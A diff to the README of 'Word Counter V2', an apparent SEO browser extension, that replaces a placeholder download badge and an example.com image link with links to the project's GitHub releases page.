@@ -24,7 +24,7 @@ We are continuously working on enhancing Word Counter V2 to provide you with mor
 ## Get Started 🚀
 Ready to boost your SEO efforts with Word Counter V2? Download the extension now and start optimizing your content for better search engine visibility!
 
-[![Download App](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/hemanthharry1706/Word-Counter-V2/releases)](https://github.com/hemanthharry1706/Word-Counter-V2/releases)
 
 Need help installing the extension or have feedback to share? Visit our website and connect with us for support and updates.
 
@@ -36,4 +36,4 @@ Help us spread the word about Word Counter V2! Share this repository with your c
 
 Let's reshape the way we approach SEO together with Word Counter V2 – your go-to tool for optimizing content and maximizing online visibility. Happy analyzing! 🚀
 
-![SEO Image](https://example.com/seo_image.png)
+![SEO Image](https://github.com/hemanthharry1706/Word-Counter-V2/releases)
